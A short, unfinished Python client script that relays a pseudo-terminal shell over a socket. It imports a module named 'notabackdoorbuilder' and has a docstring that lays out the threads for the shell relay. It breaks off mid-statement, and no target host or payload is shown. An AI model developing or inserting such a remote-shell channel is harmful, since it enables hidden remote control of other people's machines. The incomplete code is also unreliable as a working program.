import notabackdoorbuilder
import ptysocket
import threading
import time
from typing import Any
from typing import TypeVar, Generic

"""
5 io threads:
1. read_shell 		- reads from pexpect and adds the output to the output buffer.
2. write_shell		- writes to pexpect from the input buffer.
3. read_socket		- reads from socket and adds to the input buffer.
4. write_socket		- writes to socket from the output buffer.
5. timeout_manager 	- waits for 1 second, if nothing happened in a specified buffer, it will send the buffer to the other side.

one io switch to control weather we are currently reading or writing.
"""

T = TypeVar("T")

class ValueReference(Generic[T]):
	def __init__(self, value:T):
		self.value = value

def before_send(context):
	pass

notabackdoorbuilder.handle_setup("client")

def main(context):
	context["ptysocket"] = ValueReference(ptysocket.PTYSocketClient())
	pty_sock_ref:ValueReference[ptysocket.PTYSocketClient] = context["ptysocket"]

	pty_sock_ref.value.connect()
	pty_sock_ref.value.


